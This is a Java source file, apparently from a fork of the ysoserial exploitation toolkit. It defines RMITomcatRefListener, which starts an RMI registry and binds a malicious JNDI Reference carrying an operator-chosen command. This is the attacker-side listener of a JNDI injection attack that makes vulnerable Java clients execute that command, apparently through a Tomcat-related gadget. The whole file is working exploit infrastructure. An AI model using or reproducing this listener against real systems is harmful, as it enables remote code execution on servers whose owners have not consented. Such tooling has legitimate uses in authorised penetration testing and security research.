package ysoserial.exploit.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysoserial.bullet.jndi.ReferencePayload;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMITomcatRefListener {
    private Registry registry = null;

    public RMITomcatRefListener(String lhost, int lport, String objectName, ReferencePayload ref, String command) throws Exception {
//        System.setProperty("sun.rmi.transport.tcp.logLevel","BRIEF");
        if (lhost != null) {
            System.setProperty("java.rmi.server.hostname", lhost);
        }

        this.registry = LocateRegistry.createRegistry(lport);

        ReferenceWrapper referenceWrapper = new ReferenceWrapper((Reference) ref.getReference(command));
        registry.rebind(objectName, referenceWrapper);
    }
}
